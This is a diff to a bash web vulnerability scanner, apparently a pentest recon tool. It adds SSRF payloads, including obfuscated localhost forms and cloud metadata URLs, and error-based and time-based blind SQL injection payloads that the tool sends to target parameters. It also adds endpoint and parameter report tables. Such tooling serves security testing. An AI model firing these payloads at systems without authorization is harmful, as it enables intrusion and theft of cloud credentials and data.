@@ -1331,28 +1331,90 @@ step5_vuln_test() {
 
   # ── SSRF Detection ──
   if [[ -s "${OUTDIR}/active_params.txt" ]]; then
-    local ssrf_keywords='url|uri|href|src|dest|redirect|link|fetch|proxy|target|site|path|domain|host|callback|api_url|endpoint|webhook|feed|resource'
+    local ssrf_keywords='url|uri|href|src|dest|redirect|link|fetch|proxy|target|site|domain|host|callback|api_url|endpoint|webhook|feed|resource|img|image|load|open'
     local ssrf_candidates; ssrf_candidates=$(mktemp)
     grep -iE "${ssrf_keywords}" "${OUTDIR}/active_params.txt" > "$ssrf_candidates" 2>/dev/null || true
     if [[ -s "$ssrf_candidates" ]]; then
       _tool_cmd "ssrf-detect" "SSRF testing ($(wc -l < "$ssrf_candidates") candidates)"
       (
         : > "${OUTDIR}/vuln/ssrf.json"
-        local ssrf_payloads=("http://127.0.0.1" "http://localhost" "http://[::1]" "http://0x7f000001" "http://2130706433" "http://127.1" "http://0177.0.0.1")
+        # Comprehensive SSRF payloads: localhost variants, IPv6, decimal, octal, cloud metadata
+        local ssrf_payloads=(
+          "http://127.0.0.1"
+          "http://localhost"
+          "http://[::1]"
+          "http://0x7f000001"
+          "http://2130706433"
+          "http://127.1"
+          "http://0177.0.0.1"
+          "http://0"
+          "http://0.0.0.0"
+          "http://[0:0:0:0:0:ffff:127.0.0.1]"
+          "http://[::ffff:127.0.0.1]"
+          "http://127.127.127.127"
+          "http://0x7f.0x0.0x0.0x1"
+        )
+        local ssrf_meta_payloads=(
+          "http://169.254.169.254/latest/meta-data/"
+          "http://169.254.169.254/latest/user-data"
+          "http://metadata.google.internal/computeMetadata/v1/"
+          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+          "http://100.100.100.200/latest/meta-data/"
+        )
+        # Content signatures for SSRF confirmation
+        local ssrf_sigs='ami-id|instance-id|local-ipv4|computeMetadata|169\.254\.169\.254|metadata|compute\.internal|localhost|127\.0\.0\.1|0\.0\.0\.0|privateIp|<title>|<html|connection refused|ECONNREFUSED'
         while IFS='|' read -r url param _ method _; do
           [[ -z "$url" ]] || [[ -z "$param" ]] && continue
           local base_url="${url%%\?*}"
+          local found_ssrf=false
           # Get baseline
-          local bl_size; bl_size=$(_curl "${base_url}?${param}=http://traktr-canary.invalid" -o /dev/null -w '%{size_download}' 2>/dev/null) || continue
+          local bl_file; bl_file=$(mktemp "${OUTDIR}/ssrf_bl_XXXXX")
+          _curl "${base_url}?${param}=http://traktr-canary-nonexistent.invalid" -o "$bl_file" 2>/dev/null || { rm -f "$bl_file"; continue; }
+          local bl_size; bl_size=$(wc -c < "$bl_file" 2>/dev/null || echo 0)
+          local bl_md5; bl_md5=$(md5sum "$bl_file" 2>/dev/null | cut -d' ' -f1)
+          rm -f "$bl_file"
+
+          # Test localhost payloads
           for payload in "${ssrf_payloads[@]}"; do
-            local test_size; test_size=$(_curl "${base_url}?${param}=${payload}" -o /dev/null -w '%{size_download}' 2>/dev/null) || continue
-            local delta=$(( ${test_size:-0} - ${bl_size:-0} ))
-            if [[ ${delta#-} -gt 200 ]]; then
-              echo "{\"type\":\"ssrf\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"$payload\",\"confidence\":\"MEDIUM\",\"signals\":\"length_delta(${delta})\",\"curl\":\"curl -sk '${base_url}?${param}=${payload}'\"}" >> "${OUTDIR}/vuln/ssrf.json"
-              echo -e "\033[1;33m  [!!] SSRF: ${url} (${param}) payload=${payload} [MEDIUM]\033[0m" >&2
-              break
+            $found_ssrf && break
+            local resp_file; resp_file=$(mktemp "${OUTDIR}/ssrf_resp_XXXXX")
+            local encoded; encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
+            _curl "${base_url}?${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
+            local resp_size; resp_size=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
+            local resp_md5; resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)
+            local delta=$(( ${resp_size:-0} - ${bl_size:-0} ))
+            # Different response from baseline + size change OR content match
+            if [[ "$resp_md5" != "$bl_md5" ]] && { [[ ${delta#-} -gt 100 ]] || grep -qiP "$ssrf_sigs" "$resp_file" 2>/dev/null; }; then
+              local conf="MEDIUM"
+              grep -qiP "$ssrf_sigs" "$resp_file" 2>/dev/null && conf="HIGH"
+              local _esc_payload="${payload//\"/\\\"}"
+              echo "{\"type\":\"ssrf\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"$conf\",\"signals\":\"length_delta(${delta})\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/ssrf.json"
+              echo -e "\033[1;33m  [!!] SSRF: ${url} (${param}) payload=${payload} [$conf]\033[0m" >&2
+              found_ssrf=true
             fi
+            rm -f "$resp_file"
           done
+
+          # Test cloud metadata endpoints
+          if ! $found_ssrf; then
+            for payload in "${ssrf_meta_payloads[@]}"; do
+              $found_ssrf && break
+              local resp_file; resp_file=$(mktemp "${OUTDIR}/ssrf_meta_XXXXX")
+              local encoded; encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
+              _curl "${base_url}?${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
+              local resp_size; resp_size=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
+              local resp_md5; resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)
+              if [[ "$resp_md5" != "$bl_md5" ]] && [[ "$resp_size" -gt 50 ]]; then
+                if grep -qiP 'ami-id|instance-id|computeMetadata|privateIp|accountId|hostname' "$resp_file" 2>/dev/null; then
+                  local _esc_payload="${payload//\"/\\\"}"
+                  echo "{\"type\":\"ssrf_cloud_metadata\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"HIGH\",\"proof\":\"Cloud metadata accessible\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/ssrf.json"
+                  echo -e "\033[1;31m  [!!] SSRF Cloud Metadata: ${url} (${param}) payload=${payload} [HIGH]\033[0m" >&2
+                  found_ssrf=true
+                fi
+              fi
+              rm -f "$resp_file"
+            done
+          fi
         done < <(head -20 "$ssrf_candidates")
       ) &
       pids+=($!)
@@ -1360,26 +1422,70 @@ step5_vuln_test() {
     rm -f "$ssrf_candidates"
   fi
 
-  # ── SQL Injection (basic error-based) ──
+  # ── SQL Injection (error-based + time-based blind) ──
   if [[ -s "${OUTDIR}/active_params.txt" ]]; then
-    _tool_cmd "sqli-detect" "SQL injection error-based detection"
+    _tool_cmd "sqli-detect" "SQL injection detection (error + time-based blind)"
     (
       : > "${OUTDIR}/vuln/sqli.json"
-      local sqli_payloads=("'" "1' OR '1'='1" "1 AND 1=1" "1 UNION SELECT NULL--" "1; WAITFOR DELAY '0:0:1'--")
-      local sqli_sigs='SQL syntax|mysql_|ORA-|PG::|SQLITE_|ODBC|syntax error|unclosed quotation|unterminated|sql error|database error|query failed|division by zero'
+      # Error-based payloads
+      local sqli_error_payloads=("'" "'\"" "' OR '1'='1" "1' OR '1'='1'--" "1' ORDER BY 100--" "1 UNION SELECT NULL--" "' UNION SELECT NULL,NULL--" "' UNION SELECT NULL,NULL,NULL--" "') OR ('1'='1" "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--" "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--")
+      # Time-based blind payloads (MySQL, MSSQL, PostgreSQL, Oracle)
+      local sqli_time_payloads=("' AND SLEEP(3)--" "' AND SLEEP(3)#" "1 AND SLEEP(3)--" "'; WAITFOR DELAY '0:0:3'--" "' AND PG_SLEEP(3)--" "1; SELECT PG_SLEEP(3)--" "' AND (SELECT * FROM (SELECT SLEEP(3))a)--" "' AND IF(1=1,SLEEP(3),0)--")
+      local sqli_sigs='SQL syntax|mysql_fetch|mysql_num|mysql_query|mysql_|ORA-[0-9]|PG::|SQLITE_|ODBC|syntax error|Unclosed quotation|unterminated|sql error|database error|query failed|division by zero|pg_query|pg_exec|SQLite3::|Microsoft.*ODBC|JDBC|JET Database|Access Database Engine|mysql_connect|PDOException|Illuminate\\\\Database|SQLSTATE\[|quoted string not properly terminated|unexpected end of SQL|supplied argument is not a valid MySQL|Column count doesn.t match|Unknown column|Table.*doesn.t exist|You have an error in your SQL|Warning.*mysql_|Warning.*pg_|Warning.*sqlite|Warning.*oci_|Warning.*mssql_|Incorrect syntax near|Conversion failed when converting|Invalid column name|Invalid object name'
+
       while IFS='|' read -r url param _ method _; do
         [[ -z "$url" ]] || [[ -z "$param" ]] && continue
         local base_url="${url%%\?*}"
-        for payload in "${sqli_payloads[@]}"; do
-          local encoded; encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
-          local resp; resp=$(_curl "${base_url}?${param}=${encoded}" 2>/dev/null) || continue
-          if echo "$resp" | grep -qiE "$sqli_sigs"; then
-            local proof; proof=$(echo "$resp" | grep -oiE "$sqli_sigs" | head -1)
-            echo "{\"type\":\"sqli\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"$payload\",\"confidence\":\"HIGH\",\"proof\":\"$proof\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/sqli.json"
-            echo -e "\033[1;31m  [!!] SQLi: ${url} (${param}) proof='${proof}' [HIGH]\033[0m" >&2
-            break
+        local found_sqli=false
+
+        # Phase 1: Error-based detection
+        for payload in "${sqli_error_payloads[@]}"; do
+          $found_sqli && break
+          local encoded
+          encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"\"\"$payload\"\"\"))" 2>/dev/null || echo "$payload")
+          local resp_file; resp_file=$(mktemp "${OUTDIR}/sqli_resp_XXXXX")
+          if [[ "${method:-GET}" == "POST" ]]; then
+            _curl "${base_url}" -X POST -d "${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
+          else
+            _curl "${base_url}?${param}=${encoded}" -o "$resp_file" 2>/dev/null || { rm -f "$resp_file"; continue; }
           fi
+          if grep -qiP "$sqli_sigs" "$resp_file" 2>/dev/null; then
+            local proof; proof=$(grep -oiP "$sqli_sigs" "$resp_file" 2>/dev/null | head -1 | head -c 80)
+            local _esc_proof="${proof//\"/\\\"}"
+            local _esc_payload="${payload//\"/\\\"}"
+            echo "{\"type\":\"sqli\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"HIGH\",\"proof\":\"${_esc_proof}\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/sqli.json"
+            echo -e "\033[1;31m  [!!] SQLi (error-based): ${url} (${param}) proof='${proof}' [HIGH]\033[0m" >&2
+            found_sqli=true
+          fi
+          rm -f "$resp_file"
         done
+
+        # Phase 2: Time-based blind detection (only if error-based didn't find anything)
+        if ! $found_sqli; then
+          # Get baseline response time
+          local bl_time
+          bl_time=$(_curl "${base_url}?${param}=1" -o /dev/null -w '%{time_total}' 2>/dev/null) || bl_time="0.5"
+          for payload in "${sqli_time_payloads[@]}"; do
+            $found_sqli && break
+            local encoded
+            encoded=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"\"\"$payload\"\"\"))" 2>/dev/null || echo "$payload")
+            local t_start t_end t_elapsed
+            t_start=$(date +%s%N 2>/dev/null || date +%s)
+            _curl "${base_url}?${param}=${encoded}" -o /dev/null 2>/dev/null || continue
+            t_end=$(date +%s%N 2>/dev/null || date +%s)
+            t_elapsed=$(( (t_end - t_start) / 1000000000 )) 2>/dev/null || t_elapsed=0
+            # If response took >= 2.5s and baseline was < 1.5s, likely time-based SQLi
+            if [[ "$t_elapsed" -ge 2 ]]; then
+              local bl_int; bl_int=$(awk "BEGIN{printf \"%d\", ${bl_time}+0.5}" 2>/dev/null) || bl_int=1
+              if [[ "$t_elapsed" -ge $(( bl_int + 2 )) ]] || [[ "$t_elapsed" -ge 3 ]]; then
+                local _esc_payload="${payload//\"/\\\"}"
+                echo "{\"type\":\"sqli_blind\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${_esc_payload}\",\"confidence\":\"MEDIUM\",\"proof\":\"Response delayed ${t_elapsed}s (baseline: ${bl_time}s)\",\"curl\":\"curl -sk '${base_url}?${param}=${encoded}'\"}" >> "${OUTDIR}/vuln/sqli.json"
+                echo -e "\033[1;33m  [!!] SQLi (time-based blind): ${url} (${param}) delay=${t_elapsed}s [MEDIUM]\033[0m" >&2
+                found_sqli=true
+              fi
+            fi
+          done
+        fi
       done < <(head -30 "${OUTDIR}/active_params.txt")
     ) &
     pids+=($!)
@@ -1603,6 +1709,33 @@ REOF
         "${OUTDIR}/secrets.json" 2>/dev/null || true
     fi
 
+    echo ""
+    echo "---"
+    echo ""
+    echo "## Discovered Endpoints ($total_endpoints)"
+    echo ""
+    echo "| # | URL |"
+    echo "|---|-----|"
+    local _ep_num=0
+    head -50 "${OUTDIR}/all_endpoints_paths.txt" 2>/dev/null | while IFS= read -r ep; do
+      ((_ep_num++)) || true
+      echo "| ${_ep_num} | \`${ep}\` |"
+    done
+    [[ "$total_endpoints" -gt 50 ]] && echo "" && echo "_... and $((total_endpoints - 50)) more (see all_endpoints.txt)_"
+
+    echo ""
+    echo "---"
+    echo ""
+    echo "## Discovered Parameters ($total_params)"
+    echo ""
+    echo "| Endpoint | Parameter | Method | Source |"
+    echo "|----------|-----------|--------|--------|"
+    head -50 "${OUTDIR}/active_params.txt" 2>/dev/null | while IFS='|' read -r p_url p_param p_source p_method _; do
+      [[ -z "$p_param" ]] && continue
+      echo "| \`${p_url}\` | **${p_param}** | ${p_method:-GET} | ${p_source:-?} |"
+    done
+    [[ "$total_params" -gt 50 ]] && echo "" && echo "_... and $((total_params - 50)) more (see active_params.txt)_"
+
   } > "${OUTDIR}/REPORT.md"
 
   # ── poc_commands.txt ──
@@ -1682,6 +1815,36 @@ SUMEOF
   fi
 
   [[ "$total_secrets" -gt 0 ]] && printf '  \033[1;31mSecrets: %s detected!\033[0m\n' "$total_secrets" >&2 || true
+
+  # ── Always list discovered endpoints for manual testing ──
+  if [[ "$total_endpoints" -gt 0 ]]; then
+    printf '\n' >&2
+    printf '  \033[1;36m┌─── Discovered Endpoints (%s) ──────────────────────────\033[0m\n' "$total_endpoints" >&2
+    head -30 "${OUTDIR}/all_endpoints_paths.txt" 2>/dev/null | while IFS= read -r ep; do
+      printf '  \033[2m│ %s\033[0m\n' "$ep" >&2
+    done
+    [[ "$total_endpoints" -gt 30 ]] && printf '  \033[2m│ ... and %d more (see all_endpoints.txt)\033[0m\n' "$((total_endpoints - 30))" >&2
+    printf '  \033[1;36m└──────────────────────────────────────────────────────\033[0m\n' >&2
+  fi
+
+  # ── Always list discovered parameters for manual testing ──
+  if [[ "$total_params" -gt 0 ]]; then
+    printf '\n' >&2
+    printf '  \033[1;36m┌─── Discovered Parameters (%s) ─────────────────────────\033[0m\n' "$total_params" >&2
+    printf '  \033[1;36m│ %-45s %-15s %-8s %s\033[0m\n' "ENDPOINT" "PARAM" "METHOD" "SOURCE" >&2
+    head -30 "${OUTDIR}/active_params.txt" 2>/dev/null | while IFS='|' read -r p_url p_param p_source p_method _; do
+      [[ -z "$p_param" ]] && continue
+      local short_url="${p_url#http*://}"
+      [[ ${#short_url} -gt 43 ]] && short_url="${short_url:0:40}..."
+      local tag=""
+      echo "$p_param" | grep -qiE 'file|path|page|include|template|doc|load|read|dir|resource' && tag=" [LFI?]"
+      echo "$p_param" | grep -qiE 'redirect|redir|next|return|goto|callback|dest|url' && tag=" [REDIR?]"
+      echo "$p_param" | grep -qiE '^id$|user|email|name|password|token|key|secret|admin' && tag=" [IDOR?]"
+      printf '  │ %-45s \033[1;32m%-15s\033[0m %-8s %s%s\n' "$short_url" "$p_param" "${p_method:-GET}" "${p_source:-?}" "$tag" >&2
+    done
+    [[ "$total_params" -gt 30 ]] && printf '  \033[2m│ ... and %d more (see active_params.txt)\033[0m\n' "$((total_params - 30))" >&2
+    printf '  \033[1;36m└──────────────────────────────────────────────────────\033[0m\n' >&2
+  fi
   printf '\033[2m  ──────────────────────────────────────────────────────────\033[0m\n' >&2
   printf '  Report:     %s\n' "${OUTDIR}/REPORT.md" >&2
   [[ -f "${OUTDIR}/REPORT.html" ]] && printf '  HTML:       %s\n' "${OUTDIR}/REPORT.html" >&2 || true
